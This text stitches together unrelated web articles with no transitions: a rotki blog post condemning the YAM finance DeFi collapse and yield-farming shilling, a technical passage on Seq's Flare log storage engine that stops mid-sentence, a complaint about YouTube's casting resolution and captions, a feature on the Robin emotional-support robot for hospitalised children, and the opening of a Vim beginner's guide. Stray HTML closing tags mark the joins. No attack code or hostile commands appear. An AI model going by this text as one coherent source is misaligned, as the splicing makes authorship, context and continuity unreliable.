<p>There is the concept of a yield farmer, someone who provides liquidity or stakes in a protocol in return for interest, fees or some governance token. Yield farming is not bad per se. Everyone who provides liquidity in all the DeFi protocols is essentially yield farming. There is nothing wrong with that.</p>



<p><img src="https://blog.rotki.com/public/post8/defichad.jpeg"></p>



<p>The bad side of farming is the “DeFi chad” or “Defi Degen”. The kind of meme-driven farmer who jumps from protocol to protocol without any thought on contract safety, chasing the biggest yield, dumping their tokens to the new guys and then moving on. A practice that is obviously unsustainable.</p>

<h2 id="yam-finance">YAM finance.</h2>

<p>A very good example of the irresponsible approach to DeFi is YAM. An experiment that did not even manage to last 2 days. It <a href="https://medium.com/@yamfinance/yam-finance-d0ad577250c7">launched</a> in 19:00 UTC, August 11th, 2020 and <a href="https://medium.com/@yamfinance/yam-post-rescue-attempt-update-c9c90c05953f">died</a> 36 hours later.</p>

<h3 id="what-happened">What happened?</h3>

<p>YAM advertised itself as an experiment from the start. It was a mashup of code from various other DeFi projects, completely unaudited and without any safety hatches or deposit limits. For all intents and purposes a completely reckless enterprise. Despite that at its peak it had over $500m locked in it!</p>

<p>For a technical explanation of the bug read <a href="https://medium.com/@yamfinance/yam-post-rescue-attempt-update-c9c90c05953f">their post</a>. In short the bug made it impossible for the YAM holders to reach quorum on anything so essentially the governance part of the protocol was broken and without it the entire protocol could no longer function.</p>

<p>Once people realized that, the market cap of YAM went within minutes from $60m to 0. Everyone left holding YAM they bought took a loss as they can’t sell it, so did uniswap liquidity providers as they took a loss every time someone sold YAM through them.</p>

<h3 id="could-this-have-been-avoided">Could this have been avoided?</h3>

<p>ABSOLUTELY</p>

<p>There were multiple warnings from many prominet people in the crypto sector including myself that this is going to end in tears. The minimum precaution that could have been taken is:</p>

<ul>
  <li>Write contract tests</li>
  <li>Have some sort of security audit of the code</li>
  <li>IF you claim it’s an experiment then treat it as such by:
    <ul>
      <li>Putting deposit limits in the code to protect your users</li>
      <li>Put an escape hatch in the code to protect your users.</li>
    </ul>
  </li>
</ul>

<h3 id="ponzi">Ponzi</h3>

<p>What’s worse is that from the tokenomics of YAM it was obvious that this was a ponzi game. Note the difference between ponzi game and ponzi scheme as explained in <a href="https://jpkoning.blogspot.com/2018/05/ethereum-is-full-of-ponzis-is-that.html">this</a> article.</p>

<p>Every 12 hours the total supply of the token increased but the amount held by each user stayed the same through a process called rebasing. The first farmers were incentivized to pump and shill YAM via social media so they can find victims onto whom to dump their tokens after the rebase. The new holders had the exact same incentives to pump it even more so they can in turn dump their bags onto the poor sods after the second rebase. And so on and so forth.</p>

<p>It was a “fair” and transparent ponzi, but a ponzi nonetheless. And with the amount of due dilligence people do in Crypto I am 100% certain that most of the people who got shilled into it did not realize that and lost money as a result.</p>

<h3 id="shilling-in-twitter">Shilling in Twitter</h3>

<p>What I personally found <strong>absolutely disgusting</strong> was the incessant amount of shilling of YAM in Twitter by many people in the ethereum community whom I actually respect who were also farming it.</p>

<p>It’s inexcusable, reckless and irresponsible. They were shilling a protocol that had not seen any production use yet, had unaudited code, no tests, no deposit limits or anything. They were doing so only to get more people into the Ponzi game to sustain their profits and dump their bags onto them.</p>

<p>I sincerely hope lessons are now learned. If you are shilling an unaudited insecure ponzi you are part of the problem of why this sector is not taken seriously. We can’t have such irresponsible behavior if we are ever going to reach mass adoption.</p>

<h3 id="what-did-it-cost-us">What did it cost us?</h3>

<p><img src="https://blog.rotki.com/public/post8/yamcrash.jpeg"></p>

<p>Some people lost a lot of money</p>

<ul>
  <li>Marketcap dropped from $60m to $0.</li>
  <li>People who bought YAM are left holding a hot potato, got burned and lost everything they invested.</li>
  <li>Uniswap liquidity providers lost money due to providing liquidity for sellers of a dying token.</li>
  <li>Lots of money in gas fees (300+ gwei) for nothing</li>
</ul>

<p>The rest of the non yam farming ethereum users were left with 300 gwei gas prices and could not really use the ethereum blockchain.</p>

<p>And finally and most importantly, outsiders roll their eyes and we lose credibility. Every nocoiner I know that I tried to explain this to just get their view that crypto is only for scams and ponzi schemes reinforced. Can you blame them?</p>



<p>If you are to keep anything from this post as a take-home message let it be this section. DeFi is good and is here to stay. We just all need to be more responsible about it.</p>

<h2 id="responsible-defi-user">Responsible DeFi user</h2>

<p>As a user don’t rush into every new thing that pops up and promises amazing 100%+ returns. Do you due dilligence, demand audit reports, ask people in the community about the history and portfolio of the founders of the protocol and if possible read the code and understand the tokenomics. DYOR. If something sounds too good to be true that’s because it’s probably a scam or a ponzi.</p>

<h2 id="responsible-defi-founder">Responsible DeFi founder</h2>

<p>As a founder/developer for the love of god DO NOT TEST IN PRODUCTION. Be responsible. Users do not heed warnings, or disclaimers. If it’s an experiment and you want to experiment in the mainnet that’s fine. Then put deposit limits and centralized escape hatches for the first X months. The safety of your users is your responsibility. Avoiding that responsbility through the veil of “just an experiment” won’t be accepted.</p>

<h2 id="towards-a-sustainable-defi-ecosystem">Towards a sustainable DeFi ecosystem</h2>

<p>It is only through responsible development and professionalism that this sector can mature. We won’t get any new users with the YOLO yield farming memes. For DeFi to fullfill its goals of a new permisionless financial system it needs to go mainstream. And it will not achieve that through ponzi games and chad memes in Twitter. This will only be achieved when the ecosystem is perceived by normies to be mature enough so that they can also come in and participante in it. Let’s all then do our part to advance the ecosystem through responsible building and sustainable development and build a new financial system for the many and not for the few.</p>

    <p>Reading time: 15 minutes</p>
</section><!--kg-card-end: html--><p>This post is the first in a series on Seq’s storage engine. It’s a technical dive meant to share some of the more interesting aspects of its design and implementation.</p><p>Seq is a log server with its own embedded storage engine for log events<a href="https://blog.datalust.co/rust-at-datalust-how-we-integrate-rust-with-csharp/"> written (mostly) in Rust</a>. We call this storage engine <em>Flare</em>. We’ve <a href="https://blog.datalust.co/rust-at-datalust/">written a bit</a> about our experiences with Rust in the past, but we’ve been wanting to dive into the design of Flare itself since we first shipped it in August of 2018.</p><p>To get a sense of what Flare is all about we’ll first introduce its broad design and then explore some of its components. We’ll do this by tracing the ingestion of an event through Seq’s HTTP API through to disk, and then later back from disk via a query, and finally deleting the event entirely. This post is a long and tangential tour of the design and implementation of the database to provide context for deeper dives into specific components in future posts.</p><h2 id="contents">Contents</h2><ul><li><a href="#the-design-of-flare">The design of Flare</a></li><li><a href="#ingesting-events">Ingesting events</a></li><li><a href="#merging-write-optimized-files-into-read-optimized-files">Merging write-optimized files into read-optimized files</a></li><li><a href="#querying-events">Querying events</a></li><li><a href="#deleting-events">Deleting events</a></li></ul><h2 id="the-design-of-flare">The design of Flare</h2><p>Flare is a conceptually small database. It’s fully abstracted from the underlying OS and doesn’t attempt to do any of its own threading, even though it’s designed for concurrent access. That makes it nicely portable (it can actually run entirely in WebAssembly) and embedded in other programming languages. In Seq, we embed Flare in .NET.</p><figure><img src="https://blog.datalust.co/content/images/2020/08/flare-in-seq.png" alt="Flare is a combination of C# and Rust components that are used by Seq" srcset="https://blog.datalust.co/content/images/size/w600/2020/08/flare-in-seq.png 600w, https://blog.datalust.co/content/images/size/w1000/2020/08/flare-in-seq.png 1000w, https://blog.datalust.co/content/images/size/w1600/2020/08/flare-in-seq.png 1600w, https://blog.datalust.co/content/images/size/w2400/2020/08/flare-in-seq.png 2400w" sizes="(min-width: 720px) 720px"></figure><h3 id="choosing-trade-offs">Choosing trade-offs</h3><p>As a database, Flare only has three things to worry about:</p><ul><li>Storing data on disk.</li><li>Removing data from disk.</li><li>Fetching data from disk.</li></ul><p>Doing those things efficiently though, while also guaranteeing ACID properties (that is, atomicity, consistency, isolation, and durability), is actually very tricky! Even lightweight general-purpose embedded databases like SQLite are complex. Flare isn’t a general-purpose database though. To maintain performance and reliability within a manageable level of complexity, Flare takes advantage of some properties of log events in its design. Log events are:</p><ul><li>immutable.</li><li>schema-less.</li><li>about 1Kb in size on average.</li><li>written with recent timestamps.</li><li>deleted with old timestamps.</li></ul><p>We alluded to performance and reliability as constraints on Flare's design above, but there are others we have too:</p><ul><li><strong>Understandability.</strong> We're a small team with a lot of code to maintain. We need Flare to be understandable so we can quickly reconstitute the mental stack needed to work on it.</li><li><strong>Supportability.</strong> Flare is deployed in environments we have no control over. We need it to be as robust as possible and give us plenty of insight into how it's running.</li></ul><p>These properties together have lead to a design where data files can be initially appended to, but are eventually aged into an immutable format. Deletes are filtered copies into new data files.</p><p>There are some trade-offs in Flare’s design:</p><ul><li>the database is tolerant of some historical and future writes, but regular random writes (such as applications logging using <em>really</em> skewed system clocks) have poor performance characteristics.</li><li>keys have to be slowly incrementing, so the only key that makes any sense is a timestamp.</li><li>there are no random deletes, and retention isn’t really a mechanism for quickly reclaiming disk space.</li></ul><h3 id="transactions-and-state">Transactions and state</h3><p>Flare is transactional. It has three different kinds of transactions each with different capabilities for interacting with the state of the database:</p><ul><li><strong>Read transactions</strong>. These give access to the data files and can iterate through their log events. There can be any number of read transactions and they don’t block any other transactions.</li><li><strong>Write transactions</strong>. These allow data files to be created, log events to be appended to them, and for those data files to be marked as read-only. There can only be one write transaction at a time.</li><li><strong>Maintenance transactions</strong>. These allow immutable data files to be created and reshaped. They’re used for long-running background tasks. There can only be one maintenance transaction at a time.</li></ul><p>Flare uses a series of locks and MVCC (multi-version concurrency control) internally to manage its transactions. MVCC is a technique for allowing concurrent access to state by making changes to that state <em>generational</em>. State is accessed by grabbing the current generation, and is updated by creating a new generation that includes any changes. In Rust, we can model MVCC nicely using the standard <code>Arc&lt;T&gt;</code> atomic reference counted smart pointer.</p><p>The locks live at the heart of Flare together with the <em>in-memory state</em> of the database. This in-memory state is a MVCC generational set of all the database’s files and metadata. When a transaction is started it receives a snapshot of the current generation’s set of files to work with. Since transactions only see the generation that was current when they were started they don’t observe any changes made by other transactions.</p><p>As an example, consider the following chain of events:</p><ol><li>A read transaction, <code>read1</code>, is started. It’s based on the current generation <code>1</code>.</li><li>A write transaction, <code>write1</code>, is started. It’s based on the current generation <code>1</code>.</li><li>The write transaction appends some data.</li><li>The write transaction is committed. This moves the current generation to <code>2</code> to include the newly appended data.</li><li>A read transaction, <code>read2</code>, is started. It’s based on the current generation <code>2</code>.</li><li>Data is read from <code>read2</code>. It sees the data appended by <code>write1</code>.</li><li>Data is read from <code>read1</code>. It doesn’t see the data appended by <code>write1</code>.</li></ol><figure><img src="https://blog.datalust.co/content/images/2020/08/flare-transactions.png" alt="Each transaction only sees the state of the database that was current when it was started" srcset="https://blog.datalust.co/content/images/size/w600/2020/08/flare-transactions.png 600w, https://blog.datalust.co/content/images/size/w1000/2020/08/flare-transactions.png 1000w, https://blog.datalust.co/content/images/size/w1600/2020/08/flare-transactions.png 1600w, https://blog.datalust.co/content/images/size/w2400/2020/08/flare-transactions.png 2400w" sizes="(min-width: 720px) 720px"></figure><h3 id="what-s-next">What’s next?</h3><p>Flare is an embedded, transactional collection of data files that’s designed with embedding and streamlined support in mind. With that bit of context, let’s dive a little deeper by following a log event through the engine from ingestion through to querying and deletion.</p><h2 id="ingesting-events">Ingesting events</h2><p>Let’s say we have this log event:</p><pre><code>{
    "@t": "2020-07-29T07:10:16.1729056Z",
    "@mt": "Health check {Method} {TargetUrl} {Outcome} with status code {StatusCode} in {Elapsed:0.000} ms",
    "HealthCheckTitle": "Health Endpoints",
    "Method": "GET",
    "TargetUrl": "myapp/health",
    "Outcome": "succeeded",
    "Elapsed": 124.02390000000001,
    "StatusCode": 200,
    "ContentType": "application/json; charset=utf-8",
    "ContentLength": 84,
    "ProbeId": "aOiAcXYe0Znd",
    "Data": {
        "version": "1.5.314",
        "environment": "Production",
        "checks": {
            "database": {
                "isOk": true
            }
        }
    },
    "ProbedUrl": "myapp/health?__probe=aOiAcXYe0Znd",
    "@r": [
        "124.024"
    ]
}</code></pre><p>The log event first arrives as JSON at Seq’s HTTP ingestion endpoint, which is based on ASP.NET. From there it’s deserialized into a regular .NET object and appended to a write queue for persistence. The queue is flushed by serializing its waiting log events into a normalized JSON format and sending in a batch to Flare to write to disk, then adding them to Seq’s RAM cache. From here everything is Rust.</p><p>When a write needs to be performed in Flare, it is done under <em>the write lock</em> as part of a <em>write transaction</em>. The write lock ensures there’s only ever a single write transaction active at once. A write transaction is capable of creating and appending to the files used to durably persist log events. These files are called <em>ingest buffers</em> (if you have a Seq instance handy, you can find ingest buffers by looking for <code>.tick</code> files in your <code>Stream</code> folder).</p><h3 id="ingest-buffers">Ingest buffers</h3><p>Each ingest buffer is an unordered, append-only list of log events whose timestamps all fall within a fixed 5 minute range. We call these 5 minute ranges <em>ticks</em> (which is where the <code>.tick</code> extension comes from).</p><p>Log events encoded as JSON are written to an ingest buffer compressed using the snappy algorithm. These compressed bytes are staged in an in-memory buffer before reaching the underlying file. We ended up writing an implementation of the snappy framing protocol that uses a 1Kib frame size to keep its space requirements bounded (everything in Flare is designed to work in bounded space, so that it leaves plenty of RAM for the cache). Flare uses headers and trailers to separate encoded log events in all its data files, including ingest buffers, rather than a line or null delimited protocol. The header for each log event contains its timestamp and the length of the encoded payload. The trailer contains a CRC hash of the payload.</p><p>The in-memory buffer may be flushed to disk on-demand. Log events that are flushed to disk aren’t visible to new reads until they’ve been committed though. This ensures that, within the span of time covered by a <code>.tick</code> file, batched writes either succeed or fail atomically, and never leave the file in a corrupted, partially-committed, or ambiguous state. Committing an ingest buffer is done by fully flushing the in-memory buffer to disk, then writing a single <code>0xCC</code> commit byte to the data file and flushing again. The double-flush makes sure <em>all</em> written memory pages have actually been persisted to real storage, which isn’t necessarily guaranteed by a single flush on all filesystems. If the writes made to the data file don’t cross a page boundary then the double flush is avoided as an optimization in favor of a single flush after writing the commit byte.</p><figure><img src="https://blog.datalust.co/content/images/2020/08/flare-ingest-buf-format.png" alt="Ingest buffers are length-prefixed on disk" srcset="https://blog.datalust.co/content/images/size/w600/2020/08/flare-ingest-buf-format.png 600w, https://blog.datalust.co/content/images/size/w1000/2020/08/flare-ingest-buf-format.png 1000w, https://blog.datalust.co/content/images/size/w1600/2020/08/flare-ingest-buf-format.png 1600w, https://blog.datalust.co/content/images/size/w2400/2020/08/flare-ingest-buf-format.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Once the batch pulled from the write queue containing our event has been written and committed, the database advances its in-memory state to a new generation containing the file offset to the new commit byte. Then the write transaction is completed (usually to be immediately followed by a new one). Other transactions started from this point will be able to see the new batch of events.</p><h3 id="what-s-next-1">What’s next?</h3><p>So that’s how a log event sent to Seq’s HTTP API is persisted by Flare on disk. Before we look at how the event can be queried back from disk let’s give it some time to age into a different format. Ingest buffers are optimized for writes but are very slow to read in order, because they need to be sorted first.</p><h2 id="merging-write-optimized-files-into-read-optimized-files">Merging write-optimized files into read-optimized files</h2><p>Once an ingest buffer has been left …</p></section></article></div></div>

  <h2 id="the-ludicrousness-of-being-forced-to-watch-youtube-in-480p-on-a-4k-tv">The ludicrousness of being forced to watch YouTube in 480p on a 4K TV</h2>

<p>To watch YouTube videos from my phone, which is where I find them, on my TV, which is where I want to watch them, I’ve long since thrown up my hands and given up using the Cast function of the app. Every time I do, the video shows in 480p, even though I have a fiber connection on which YouTube never buffers. If I change the resolution to 1080p, YouTube stubbornly continues to play the video in a resolution that belongs in the 90s. The issue is <a href="https://support.google.com/chromecast/thread/2308994?hl=en" rel="nofollow noopener" target="_blank" data-vars-outbound-link="https://support.google.com/chromecast/thread/2308994?hl=en">widespread</a>, and pre-dates YouTube’s limitations put in place during the pandemic. My TV is an Android TV, made for Google integration with a built-in YouTube app, and my phone is a Pixel phone. Partially chosen with the hope that they’d work well together.</p>

<p>My connection and TV are perfectly capable of playing the video in 1080p, as I learnt when I discovered a clumsy, irritating workaround: adding videos to my Watch Later list on my phone, then opening the YouTube app on my TV, and fumbling through its clumsy interface with a clumsy remote to pick them up again directly on the TV. Plays in 1080p just fine, no buffering.</p>

<figure><img alt="Thousands of YouTube users frustrated with a long-lived bug" width="840" height="593" src="https://i.imgur.com/zD5nKkS.png"><figcaption>Thousands of YouTube users frustrated with a long-lived bug</figcaption></figure>

<h2 id="have-some-captions-with-that">Have some captions with that</h2>

<p>Even when I’ve given in and kept casting blurry videos, a bizarre issue crops up. After watching for a lengthy period of time, maybe an hour or two, YouTube will decide to pop up English captions over an English video while watching on my English account. I’ll shake my head and switch them off; thankfully at least that setting works even if the quality setting doesn’t. Problem is, when the next video in the queue starts playing, the captions switch themselves back on, for every video thereafter. It’s only rectified by disconnecting my phone from my TV, which loses my queued videos, and starting again. This has been happening for many users, and shockingly, <a href="https://support.google.com/youtube/thread/38916902?hl=en" rel="nofollow noopener" target="_blank" data-vars-outbound-link="https://support.google.com/youtube/thread/38916902?hl=en">since 2013</a>.</p>

<p>I can only imagine there’s some kind of complicated machine learning going on here - after all YouTube seems to apply fuzzy logic when it decides to turn captions on or off by itself - the captions come on for some non-English videos but not others. It works a lot of the time and seems fairly smart, but not smart enough: they come on only some of the time I watch a K-pop music video, even by the same artist, for example. Every time this happens, I turn off the captions and rewind the video, providing plenty of data, which I’m sure Google is dutifully recording, about my captioning habits, data it could be using to decide whether to override my choices and turn them back on incessantly.</p>

<p>In a pre-ML world, you might code the captions to come on for non-English videos on an English account, perhaps making a different decision based on music videos, and provide a setting, so the user can decide. This would perfectly suit my needs. The behaviour would be predictable, and in my control. This is a problem with the state of ML these days: the decision is completely opaque, inevitably flawed, and non-overridable.</p>

<h2 id="if-you-cant-guess-just-let-me-choose">If you can’t guess just let me choose</h2>

<p>Playing videos directly on my phone is just as frustrating. Much of the time (but not all of the time) I choose something to watch, it’s 480p on my fiber connection which never buffers. Sometimes the video plays in 1080p, but whether it does or not is completely unpredictable. Now everytime I play a video I immediately open the quality settings and change it over to 1080p and rewind, if it isn’t already. It appears to be happening to <a href="https://support.google.com/youtube/thread/14927224?hl=en" rel="nofollow noopener" target="_blank" data-vars-outbound-link="https://support.google.com/youtube/thread/14927224?hl=en">plenty</a> of <a href="https://www.reddit.com/r/youtube/comments/ae5utz/auto_quality_setting_keeps_defaulting_to_the/" rel="nofollow noopener" target="_blank" data-vars-outbound-link="https://www.reddit.com/r/youtube/comments/ae5utz/auto_quality_setting_keeps_defaulting_to_the/">users</a>.</p>

<p>If this is the result of YouTube attempting to intelligently guess a resolution that won’t buffer, it’s failing miserably. Were they to provide an option to always stream at a minimum 1080p, users’ experience would be much better - they could even choose auto if they want to let YouTube decide for them. Instead YouTube makes a decision for me with an invisible process I have no say in.</p>

<figure><img alt="YouTube’s widely reviled video suggestions" width="775" height="530" src="https://i.imgur.com/WpPKYs4.jpg"><figcaption>YouTube’s widely reviled video suggestions</figcaption></figure>

<p>Users often take a back seat on YouTube. One of the issues in YouTube’s support forums with the <a href="https://support.google.com/youtube/thread/11285006?hl=en" rel="nofollow noopener" target="_blank" data-vars-outbound-link="https://support.google.com/youtube/thread/11285006?hl=en">most upvotes</a> concerns the recommended video thumbnails which can overlap the last <a href="https://support.google.com/youtube/answer/6388789?hl=en" rel="nofollow noopener" target="_blank" data-vars-outbound-link="https://support.google.com/youtube/answer/6388789?hl=en">5-20 seconds</a> of the video you chose to watch, causing what is often a significant interruption, or in the case of the support thread above, a critical penalty save in a soccer match. Some argue that it’s up to the uploader to add these or not. It’s up to YouTube whether they appear over the last 1 second or 20, or appear under a video rather in massive intrusive thumbnails over the video. I pay for YouTube, but I have no control over these. If it’s just being provided in the user’s interest, why not give us the option to switch them off?</p>

<h2 id="play-music-or-youtube-music">Play Music or YouTube Music</h2>

<p>Google Play Music is shutting down in favor of YouTube Music, both are services I’ve used for years and pay for. Play Music is different in that it stores your own uploaded music, from back when people had such things. As it’s shutting down, these uploads are being transferred across to YouTube Music. It turns out you <a href="https://support.google.com/youtubemusic/thread/45163028?hl=en" rel="nofollow noopener" target="_blank" data-vars-outbound-link="https://support.google.com/youtubemusic/thread/45163028?hl=en">can’t transfer your uploaded music to a “Brand account”</a> - I’m not a brand, I have an account which doesn’t use my real name because I prefer to remain anonymous amongst, well, YouTubers. This was made possible when Google <a href="https://www.theguardian.com/technology/2014/jul/16/youtube-trolls-google-real-name-commenter-policy" rel="nofollow noopener" target="_blank" data-vars-outbound-link="https://www.theguardian.com/technology/2014/jul/16/youtube-trolls-google-real-name-commenter-policy">backtracked</a> after the disastrous ruckus that began when they tried to enforce a real-name policy.</p>

<p>But it also meant that users ended up with 2 YouTube accounts, unwittingly, one with their Google-set real name, and a so-called brand account. A problem arose. In YouTube Music, I have one account with all my music history, likes, favorites, and recommendations, and another with my substantial uploaded music library. Which means I can’t benefit from recommendations based on my history, without rebuilding it all over again with my real name account (which I’d rather not do, in any case, but have no power over.)</p>

<p>In the <a href="https://support.google.com/youtubemusic/thread/45163028?hl=en" rel="nofollow noopener" target="_blank" data-vars-outbound-link="https://support.google.com/youtubemusic/thread/45163028?hl=en">YouTube support thread</a> announcing this, Hazel from TeamYouTube happily says “If you have any more questions, let us know in the comments below!”, then received a critical comment, and promptly locked the thread.</p>

<h2 id="let-users-have-some-control-in-the-apps-they-use">Let users have some control in the apps they use</h2>

<p>YouTube, like many big tech companies in the ML age, are using algorithms to govern the experience of their billions of users with inner workings that are invisible to their users, frequently work against their interest, and are unable to be overridden. Worse, whether it’s a bug that’s been around since 2013, a smart AI which isn’t so smart, or a crummy user experience decision, users aren’t being heard or their choices respected.</p>

<p><span>S</span>arah, an eight-year-old pneumonia patient at <a href="http://www.wigmoreclinic.am/">Wigmore Clinic</a>, had barely eaten for two days. She was scared and depressed; none of the medical staff’s pleas that she try a bite of salad or meat had worked. Then Robin entered her room. Robin made eye contact with Sarah, guessing her age and gender. Robin said hello. Sarah said hello back. They talked about their favorite colors and animals and played “I spy.”&nbsp;</p>



<p>After 20 minutes, Robin told her, “I need to recharge my battery.”&nbsp;</p>



<p>“No, no. Don’t go,” Sarah said. “I want to play more.”&nbsp;</p>



<p>“I will come back if you recharge yourself too,” Robin said.&nbsp;</p>



<p>Sarah picked up her plate and started to eat. Robin, a nearly 4-foot-tall robot, smiled and wheeled away.</p>



<p>In the hallway, Sarah’s parents approached <a href="https://www.linkedin.com/in/karenkhachikyan/">Karén Khachikyan</a>, CEO and co-founder of Expper Technologies, to give him a hug. The robot’s intervention had worked. “It was a very emotional and inspiring moment for us,” Khachikyan said. “We saw how important peer-to-peer connection and interactions are.”&nbsp;</p>



<p><a href="https://www.forbes.com/sites/jeffkart/2020/06/17/robin-the-robot-comforts-kids-in-hospitals-can-help-with-covid-19/">Robin</a>, an <a href="https://meaww.com/amp/robin-friendly-robot-companion-children-expper-tech-la-hospital-khachikyan-armenian-start-up">emotional-support robot</a> for hospitalized children designed by the Armenian startup <a href="https://www.expper.tech/">Expper Technologies</a>, launched earlier this year in four hospitals in Armenia and <a href="https://www.uclahealth.org/welcome-robin-the-ai-robot">expanded</a> to <a href="https://www.abckidsdentalla.com/">ABC Kids Dental Group</a> in Los Angeles and <a href="https://www.uclahealth.org/mattel/">UCLA Mattel Children’s Hospital</a> <a href="https://www.uclahealth.org/body.cfm?id=1397&amp;action=detail&amp;ref=7280&amp;fr=true">in July</a>. Robin can speak English and Armenian, though the team is considering adding Spanish to better serve patients in California. The robot is gender-neutral, roughly the size of an 8-year-old child, and ergonomically designed to be huggable. The robot’s face is an 11-inch display screen that can show various emotions through facial expressions as well as play cartoons, animations, or interactive games.&nbsp;</p>



<p>When he was a university student, then-26-year-old Khachikyan designed <a href="https://www.f6s.com/karenkhachikyan">Charlie</a>, an educational robot that was used by more than 300 children in Armenia. He theorized that, if children were emotionally connected to Charlie, they would be more motivated to learn. “We were creating a friend,” he said.</p>



<p>Now Khachikyan’s goal is to change the way that kids experience hospitalization — particularly, to ameliorate their feelings of loneliness and fear. Robin the robot automates emotional labor in a medical setting, not with the aim of replacing people but of augmenting them, filling in the gaps in emotional support. Why settle for a doctor, nurse, and occupational therapist when you could have all three — plus a robot to keep your fears at bay?&nbsp;</p>



<p>Hospital workers are often overwhelmed. <a href="https://www.researchgate.net/publication/326278803_The_emotional_labor_automation_model_Towards_the_unmanaged_heart">Ekaterina Pogrebtsova</a>, a psychology researcher at the University of Guelph in Ontario, focuses on the cognitive automation processes of emotional labor in humans. She said nursing professionals often suffer from burnout because they perform emotionally intensive tasks on a daily basis. While there are techniques for lessening the strain of this work, they take time to perfect. Pogrebtsova said AI technologies like Robin can “supplement a lot of the tedious, laborious work that employees have had to do for centuries now.”&nbsp;</p>



<p>There are some delightful (and odd) examples of robots that have tried to fulfill emotional needs in a medical setting. Many are furry and responsive. <a href="https://www.sproutel.com/products.html">My Special Aflac Duck</a> is a white duck that <a href="https://www.youtube.com/watch?v=4gbzcDJKxlI">comforts</a> children diagnosed with cancer. Kids can tap seven different cards to the duck’s chest, each of which prompts the duck to express the emotion displayed on the card. (If you put your finger in the duck’s mouth, it will pretend to eat.) PARO, a robotic <a href="https://vancouversun.com/news/robotic-seal-provides-emotional-support-for-alzheimers-patients-at-vancouver-general-hospital">baby harp seal</a>, is covered with tactile sensors on its body and whiskers. PARO is able to recognize its own name and uses AI to repeat behaviors that, in the past, have led to its being petted. There are over 6,000 PARO units in use worldwide, mostly in patient-care settings.&nbsp;</p>



<p>Other examples are even more surreal. <a href="https://www.youtube.com/watch?v=Ugv2LqlepGw">Qoobo</a>, a <a href="https://www.youtube.com/watch?v=-2TbYYXajNY">headless, tadpole-like cushion</a> developed by <a href="https://www.ux-xu.com/products-en">Yukai Engineering</a>, is designed to soothe. A robotic tail wags vigorously when the cushion is petted quickly, at a lackadaisical pace when petted slowly, and intermittently when left by itself. When the product launched in Japan in December 2018, the intended audience was women in their 20s and 30s who live alone and want a pet. Since then, Qoobo has found a market in nursing homes and among patients who have dementia or Alzheimer’s; 15,000 units have been sold in Japan and some 300 in the U.S. A smaller, more portable version, <a href="https://camp-fire.jp/projects/view/228513">Petit Qoobo</a>, is now available for preorder. Petit Qoobo even has a subtle heartbeat.</p>

<p>When Khachikyan and his team were researching the existing landscape of emotional-support robots, they noticed that many models were created as toys or tools of distraction. “There is a lack of communication,” he said. “They are not social.”&nbsp;</p>



<p>Khachikyan’s Expper Technologies focused on creating a robotic peer who lives in the hospital and behaves like a child. “When kids see Robin, it’s like they see another kid,” Khachikyan said. Many of the children put their arms around the robot for a hug. In preliminary tests, some children grew so affectionate toward Robin that they asked if they could get sick again, in order to see it again.&nbsp;</p>



<p>Rather than relying on preprogrammed dialogues providing generic answers to particular questions, the team at Expper trained Robin by studying the conversational patterns of two Armenian psychologists and an occupational therapist. The engineers then used behavior cloning — a machine-learning technique — to teach Robin how to mimic the professionals. The model learns the style of a psychologist’s speech and copies the way they interact with patients.&nbsp;</p>



<p>Robin’s front-facing camera is equipped with facial-recognition technology that analyzes a child’s facial expressions, mood, age, gender, and conversation in order to build a holistic understanding of a child’s emotional state. Based on this analysis, Robin can suggest games or ask questions, in order to improve a child’s mood. An embedded memory model allows Robin to remember particular details about a patient and build follow-up conversations based on that memory.&nbsp;</p>



<p>Mineh Badmagharian, an occupational therapist on the Expper team, described the algorithm directing Robin as a “two-player positive-sum game.” Robin and the child are working together. “The kid wants to receive positive emotions, and Robin’s objective is to maximize that,” she told <em>Rest of World. </em></p>



<p>Last year, Khachikyan and his team raised $200,000 in initial funding from <a href="https://www.smartgate.vc/portfolio">SmartGateVC</a>, <a href="https://hiveventures.co/">HIVE Ventures</a>, and angel investors. They are currently in seed funding to advance the technology and begin mass-producing Robins. The robots are manufactured in Armenia, though Khachikyan said they aim to move production to China. With the success of Robin among adolescent patients, Expper is considering expanding into the field of elder care.</p>



<p>We tend to hear about robots and AI working in less wholesome, less emotionally involved contexts; facial recognition, surveillance, self-driving cars, and customer-service chatbots can have an eldritch <a href="https://www.forbes.com/sites/cognitiveworld/2020/06/15/perfectly-imperfect-coping-with-the-flaws-of-artificial-intelligence-ai/">underbelly</a>. Robin and a generation of emotional-support robots show that AI can replace human <a href="https://howwegettonext.com/let-robots-handle-your-emotional-burnout-at-work-e09babbe81e8">emotional labor</a>, narrowing <a href="https://knowledge.insead.edu/blog/insead-blog/can-emotion-be-automated-11941">emotional literacy gaps</a> between robots and humans. “I believe that people need people,” Khachikyan said. “We don’t want to replace anyone with Robin. Our vision is to create a teammate.”</p>

It is included as "vi" with most UNIX systems and with Apple OS X.I attempted to learn Vim quite a few times before but could not cope up with it. But recently I thought I should at least know very basic usage of Vim. So I started learning the absolute basics. Here I am putting all the basic commands and usage of Vim for any absolute beginner like me. This can be helpful to get started with Vim I think. But there is a lot of things to learn about this handy tool that will take much time and practice. One will get proficient in using Vim only by using it consistently.</p>
<p>Vim has two basic modes:</p>
<ol>
<li>One is <code>INSERT</code> mode, in which you write text as if in a normal text editor.</li>
<li>Another is <code>NORMAL</code> mode which provides you efficient ways to navigate and manipulate text. This is also called <code>Command</code> mode cause we can do various vim commands on this mode.</li>
</ol>
<p>To change between modes, use <code>ESC</code> for normal mode and <code>i</code> for insert mode.</p>
<h2 id="vim-commands">VIM Commands</h2>
<table>
<thead>
<tr>
<td>Command</td><td>Action</td></tr>
</thead>
<tbody>
<tr>
<td>:e <em>filename</em></td><td>Open <em>filename</em> for editon</td></tr>
<tr>
<td>:w</td><td>Save file</td></tr>
<tr>
<td>:q</td><td>Exit vim</td></tr>
<tr>
<td>:q!</td><td>Quit without saving</td></tr>
<tr>
<td>:x</td><td>Save and Exit</td></tr>
<tr>
<td>:sav <em>name</em></td><td>Save current file as <em>name</em></td></tr>
<tr>
<td>.</td><td>Repeat last change made in <code>NORMAL</code> mode</td></tr>
</tbody>
</table>
<hr>
<h2 id="cursor-movements">Cursor Movements</h2>
<ul>
<li><code>h</code> to move cursor left (←)</li>
<li><code>l</code> to move cursor right (→)</li>
<li><code>k</code> to move cursor up (↑)</li>
<li><code>j</code> to move cursor down (↓)</li>
<li><code>b</code> moves to the beginning of the word</li>
<li><code>e</code> moves to the end of the word</li>
<li><code>w</code> moves to the beginning of the next word</li>
</ul>
